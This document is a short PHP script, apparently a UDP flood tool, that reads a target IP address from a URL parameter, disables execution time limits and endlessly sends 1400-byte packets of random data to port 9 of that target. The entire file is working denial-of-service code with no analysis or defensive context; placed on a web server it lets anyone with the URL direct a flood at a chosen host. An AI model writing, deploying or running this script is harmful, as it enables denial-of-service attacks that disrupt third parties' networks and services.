<?php 
ignore_user_abort(1);
ignore_user_abort();
set_time_limit(0);
if (!$_GET['target']) 
   die('sem ip adicionado'); 

$target = $_GET['target']; 
$sock = socket_create(AF_INET,SOCK_DGRAM,SOL_UDP); 

if(!$sock) 
  die(__LINE__); 

$data=''; 

for ($i=0;$i<1400;$i++) 
{ 
  $data.=chr(rand(0,255)); 
} 

while(true) 
{ 
  if (!socket_sendto($sock,$data,strlen($data),0,$target,9)) 
    die(__LINE__); 
echo('-'); 
} 
?>